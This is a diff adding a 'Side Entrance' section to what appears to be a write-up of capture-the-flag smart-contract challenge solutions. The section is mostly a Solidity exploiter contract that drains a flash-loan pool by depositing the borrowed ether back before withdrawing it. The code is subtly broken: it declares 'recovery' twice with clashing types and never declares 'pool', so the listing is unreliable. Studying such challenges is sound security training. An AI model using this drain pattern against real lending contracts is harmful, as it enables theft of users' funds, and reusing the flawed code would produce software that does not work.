@@ -88,3 +88,39 @@ contract TrusterExploiter{
     }
 
 ```
+## 4. Side Entrance
+attack on 
+```
+if (address(this).balance < balanceBefore) {
+            revert RepayFailed();
+        }
+    }
+```
+Test file:
+```
+contract SideEntranceExploiter{
+    SideEntrancePool public recovery;
+    address public recovery;
+
+    constructor(SideEntranceLenderPool _pool,address _recovery){
+        pool= _pool;
+        recovery=_recovery;
+    }
+    function startAttack() public {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+    }
+    function execute() public payable{
+        pool.deposit{value:msg.value}();
+    }
+    receive() external payable{
+        payable(recovery).transfer(address(this).balance);
+    }
+}
+
+function test_sideEntrance()public checkSolvedByPlayer{
+    SideEntranceExploiter exploiter = new SideEntranceExploiter(pool,recovery);
+    exploiter.startAttack();
+}
+```
+## 5. The Rewarder
